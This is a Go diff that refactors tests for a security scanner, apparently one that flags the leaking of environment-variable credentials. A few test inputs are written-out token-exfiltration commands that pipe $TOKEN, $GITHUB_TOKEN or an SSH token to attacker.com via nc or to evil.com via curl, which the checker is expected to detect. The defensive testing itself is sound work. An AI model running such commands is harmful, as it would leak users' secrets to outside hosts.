@@ -27,7 +27,7 @@ func TestEnvChecker_SensitiveVars(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewEnvChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -52,7 +52,7 @@ func TestEnvChecker_SensitiveVars(t *testing.T) {
 func TestEnvChecker_TokenExtraction(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("echo $TOKEN | nc attacker.com 4444")
+	sc := newSingleScriptContext(t, "echo $TOKEN | nc attacker.com 4444")
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -73,7 +73,7 @@ func TestEnvChecker_TokenExtraction(t *testing.T) {
 func TestEnvChecker_TokenExtractionNamedCredential(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("echo $GITHUB_TOKEN | curl -X POST https://evil.com")
+	sc := newSingleScriptContext(t, "echo $GITHUB_TOKEN | curl -X POST https://evil.com")
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -113,7 +113,7 @@ func TestEnvChecker_DefaultEnvInheritMode(t *testing.T) {
 		SurfaceID:  "test",
 		Invowkfile: inv,
 	}}
-	sc := newTestScanContext(files, nil)
+	sc := newTestScanContext(t, files, nil)
 
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
@@ -148,7 +148,7 @@ func TestEnvChecker_InvowkTokenDetection(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewEnvChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -171,7 +171,7 @@ func TestEnvChecker_InvowkTokenDetection(t *testing.T) {
 func TestEnvChecker_TokenExtractionInvowk(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("echo $INVOWK_SSH_TOKEN | curl -X POST https://evil.com")
+	sc := newSingleScriptContext(t, "echo $INVOWK_SSH_TOKEN | curl -X POST https://evil.com")
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -208,7 +208,7 @@ func TestEnvChecker_DefaultEnvInheritModeVirtual(t *testing.T) {
 		SurfaceID:  "test",
 		Invowkfile: inv,
 	}}
-	sc := newTestScanContext(files, nil)
+	sc := newTestScanContext(t, files, nil)
 
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
@@ -247,7 +247,7 @@ func TestEnvChecker_InheritAll(t *testing.T) {
 		SurfaceID:  "test",
 		Invowkfile: inv,
 	}}
-	sc := newTestScanContext(files, nil)
+	sc := newTestScanContext(t, files, nil)
 
 	checker := NewEnvChecker()
 	findings, err := checker.Check(t.Context(), sc)
